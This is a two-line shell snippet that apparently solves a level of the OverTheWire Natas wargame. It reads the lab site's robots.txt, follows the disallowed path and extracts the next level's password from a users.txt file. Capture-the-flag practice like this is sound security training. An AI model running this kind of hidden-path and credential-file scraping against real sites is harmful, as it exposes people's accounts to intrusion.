```
natas4pass=$(curl -s -u natas3:$natas3pass http://natas3.natas.labs.overthewire.org"$(curl -s -u natas3:$natas3pass http://natas3.natas.labs.overthewire.org/robots.txt | grep Disallow: | sed 's/Disallow: //')"users.txt | sed 's/natas4://')
echo $natas4pass
```
